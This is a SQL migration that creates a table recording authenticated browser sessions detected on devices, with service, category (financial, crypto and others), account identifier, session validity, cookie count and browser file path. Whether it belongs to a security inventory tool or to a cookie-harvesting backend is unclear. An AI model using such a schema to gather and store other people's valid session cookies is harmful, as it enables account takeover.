-- Add cookie sessions table for detected authenticated sessions

CREATE TABLE IF NOT EXISTS cookie_sessions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  service VARCHAR(100) NOT NULL COMMENT 'Service name (Google, Facebook, etc.)',
  service_category ENUM('email', 'social', 'ecommerce', 'financial', 'crypto', 'gaming', 'development', 'streaming', 'cloud', 'other') DEFAULT 'other',
  account_identifier VARCHAR(500) NULL COMMENT 'Email, username, or user ID',
  session_valid BOOLEAN DEFAULT FALSE COMMENT 'Whether session is still valid',
  expires_at TIMESTAMP NULL COMMENT 'Session expiration time',
  cookie_count INT DEFAULT 0 COMMENT 'Number of auth cookies found',
  has_auth_token BOOLEAN DEFAULT TRUE,

  -- Security flags
  security_httponly BOOLEAN DEFAULT FALSE,
  security_secure BOOLEAN DEFAULT FALSE,
  security_samesite VARCHAR(20) NULL,

  -- Browser info
  browser VARCHAR(100) NULL,
  profile VARCHAR(100) NULL,
  file_path TEXT NULL,

  -- Metadata
  detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE,
  INDEX idx_device_id (device_id),
  INDEX idx_service (service),
  INDEX idx_service_category (service_category),
  INDEX idx_session_valid (session_valid),
  INDEX idx_account_identifier (account_identifier(255)),
  INDEX idx_browser (browser),
  INDEX idx_detected_at (detected_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
